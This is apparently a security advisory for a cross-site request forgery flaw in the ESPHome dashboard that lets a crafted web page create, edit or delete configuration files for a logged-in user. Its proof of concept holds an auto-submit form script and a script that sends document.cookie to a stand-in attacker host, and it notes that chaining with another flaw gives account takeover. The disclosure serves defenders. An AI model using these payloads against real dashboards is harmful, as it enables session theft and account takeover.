# Authentication bypass via Cross site request forgery

High

[jesserockz](/jesserockz)
published
GHSA-5925-88xh-6h99
Mar 20, 2024

## Package

pip

esphome
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

2023.12.9

## Patched versions

2024.3.0

## Description

### Summary

API endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out attacks against a logged user of the dashboard to perform operations on configuration files (create, edit, delete).

### Details

It is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.

### PoC

An example of malicious web page that abuses this vulnerability:

```
<script>
document.forms[0].submit();
</script>

<script>
</script>

```

In which an attacker creates and weaponizes "poc.yaml" config file containing a cookie exfiltration script and forces the payload triggering visiting the vulnerable page.

Example of such script:

<script>
fetch('https://attacker.domain', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
### Impact

This vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of a logged user. In order to trigger the vulnerability, the victim must visit a weaponized page.

In addition to this, it is possible to chain this vulnerability with [GHSA-9p43-hj5j-96h5](https://github.com/advisories/GHSA-9p43-hj5j-96h5 "GHSA-9p43-hj5j-96h5") (as seen in the PoC) to obtain a complete takeover of the user account.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
